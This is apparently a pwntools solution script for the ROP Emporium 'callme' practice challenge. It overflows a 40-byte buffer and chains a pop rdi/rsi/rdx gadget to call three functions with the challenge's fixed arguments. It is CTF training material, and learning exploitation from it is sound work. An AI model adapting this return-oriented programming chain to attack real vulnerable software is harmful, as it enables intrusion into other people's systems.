from pwn import *

elf = ELF("./callme")

io = gdb.debug(elf.path)

# parameters order: RDI, RSI, RDX, RCX, R8, R9
pop_rdi_rsi_rdx = 0x000000000040093c # pop rdi ; pop rsi ; pop rdx ; ret

io.sendline(b"A" * 40 + \
        p64(pop_rdi_rsi_rdx) + \
        p64(0xdeadbeefdeadbeef) + \
        p64(0xcafebabecafebabe) + \
        p64(0xd00df00dd00df00d) + \
        p64(elf.symbols["callme_one"]) + \

        p64(pop_rdi_rsi_rdx) + \
        p64(0xdeadbeefdeadbeef) + \
        p64(0xcafebabecafebabe) + \
        p64(0xd00df00dd00df00d) + \
        p64(elf.symbols["callme_two"]) + \

        p64(pop_rdi_rsi_rdx) + \
        p64(0xdeadbeefdeadbeef) + \
        p64(0xcafebabecafebabe) + \
        p64(0xd00df00dd00df00d) + \
        p64(elf.symbols["callme_three"]))

io.interactive()
